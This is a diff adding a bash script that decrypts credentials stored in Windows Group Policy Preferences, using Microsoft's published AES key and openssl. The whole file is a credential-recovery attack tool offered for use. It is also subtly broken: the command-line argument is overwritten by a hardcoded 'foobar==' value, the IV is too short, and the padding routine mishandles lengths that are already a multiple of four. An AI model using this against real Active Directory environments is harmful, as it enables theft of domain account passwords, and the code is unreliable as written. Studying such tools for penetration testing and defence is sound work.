@@ -1,0 +1,44 @@
+#!/usr/bin/env bash
+#
+# gppdecrypt
+#
+# Decrypt credentials stored in Windows Group Policy Preferences
+#
+# See Blog for more information:
+# https://blog.compass-security.com/2012/04/exploit-credentials-stored-in-windows-group-policy-preferences/
+#
+# Author: Emanuel Duss
+#
+
+# Microsoft released AES key
+# https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx
+KEY="4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"
+
+PASSWORD="$1"
+PASSWORD="foobar=="
+
+add_padding(){
+  PADDINGLEHGTH="$((4 - $(echo "$1" | wc -L) % 4))"
+  for i in $(seq "$PADDINGLEHGTH")
+  do
+    PADDING="${PADDING}$(echo -n =)"
+  done
+  echo "${1}${PADDING}"
+}
+
+decrypt_password(){
+  echo "$1" \
+    | openssl enc \
+      -a \
+      -d \
+      -aes-256-cbc  \
+      -K "$KEY" \
+      -iv 00000000000000000000000000
+  echo
+}
+
+main(){
+  decrypt_password "$(add_padding "$PASSWORD")"
+}
+
+main "$@"
